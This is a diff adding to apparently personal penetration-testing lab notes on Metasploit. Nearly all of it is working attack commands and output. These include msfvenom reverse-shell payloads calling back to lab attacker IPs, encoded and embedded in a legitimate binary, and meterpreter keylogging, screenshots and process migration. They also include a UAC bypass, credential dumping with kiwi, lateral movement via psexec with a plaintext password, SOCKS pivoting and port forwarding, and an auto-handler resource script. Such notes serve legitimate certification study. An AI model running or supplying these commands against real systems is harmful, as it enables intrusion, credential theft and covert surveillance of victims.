@@ -204,7 +204,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/sh
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
 
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.119.175 LPORT=4444 -f elf -o shell_reverse_staged
 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.175 LPORT=4444 -f elf -o shell_reverse_non-staged
 
 ```
 
@@ -335,5 +337,162 @@ msf5 exploit(multi/handler) > sessions -i 6
 [*] Starting interaction with 6...
 
 meterpreter >
+
+```
+
+##### Post Exploitation
+
+```
+meterpreter > screenshot
+
+meterpreter > keyscan_start 
+Starting the keystroke sniffer ...
+
+meterpreter > keyscan_dump 
+Dumping captured keystrokes... ipconfig<CR>
+whoami<CR>
+
+meterpreter > keyscan_stop 
+Stopping the keystroke sniffer... 
+meterpreter >
+
+```
+Migrating process
+
+```
+meterpreter > ps
+
+Process List
+============
+PID PPID Name
+--- ---- ----
+...
+3116 904 WmiPrvSE.exe
+3164 3568 shell_reverse_msf_encoded.exe x86 1 corp\offsec C:\Users\Offsec.corp\Desktop\shell_reverse_msf_encoded.exe
+3224 808 msdtc.exe
+3360 1156 sihost.exe C:\Windows\System32\sihost.exe 3544 808 syncbrs.exe
+3568 1960 explorer.exe C:\Windows\explorer.exe
+3820 808 svchost.exe C:\Windows\System32\svchost.exe ...
+
+meterpreter > migrate 3568
+
+```
+
+Post exploitation modules
+
+```
+
+msf5 > use exploit/windows/local/bypassuac_injection_winsxs
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options
+
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10 SESSION => 10
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > help powershell
+
+meterpreter > powershell_execute "$PSVersionTable.PSVersion"
+
+
+meterpreter > load kiwi Loading extension kiwi...
+Success.
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > creds_msv
+
+```
+
+Pivoting with Metasploit Framework
+
+```
+
+ipconfig
+
+msf5 > route add 192.168.1.0/24 11 
+[*] Route added
+msf5 > route print
+
+msf5 > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
+RHOSTS => 192.168.1.110
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389 
+PORTS => 445,3389
+msf5 auxiliary(scanner/portscan/tcp) > run
+
+
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
+SMBDomain => corp
+msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin 
+SMBUser => jeff_admin
+msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09! 
+SMBPass => Qwerty09!
+msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110 
+RHOSTS => 192.168.1.110
+msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp 
+payload => windows/meterpreter/bind_tcp
+msf5 exploit(windows/smb/psexec_psh) > set LHOST 192.168.1.110 
+LHOST => 192.168.1.110
+msf5 exploit(windows/smb/psexec_psh) > set LPORT 444 
+LPORT => 444
+msf5 exploit(windows/smb/psexec_psh) > exploit
+
+
+
+msf5 exploit(multi/handler) > use multi/manage/autoroute 
+
+msf5 post(multi/manage/autoroute) > show options
+
+msf5 post(multi/manage/autoroute) > sessions -l
+
+msf5 post(multi/manage/autoroute) > set session 4 
+session => 4
+msf5 post(multi/manage/autoroute) > exploit
+
+
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a 
+msf5 auxiliary(server/socks4a) > show options
+
+msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1 
+SRVHOST => 127.0.0.1
+msf5 auxiliary(server/socks4a) > exploit -j
+
+
+kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+
+kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+
+portfwd -h 
+
+portfwd add -l 3389 -p 3389 -r 192.168.1.110
+
+rdesktop 127.0.0.1
+
+```
+##### Metasploit automation
+
+setup.rc
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https 
+set LHOST 192.168.119.175
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false 
+exploit -j -z
+ 
+```
+
+starting metasploit using resource script
+
+```
+
+sudo msfconsole -r setup.rc
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.175 LPORT=443 -f exe -o met.exe
 
 ```
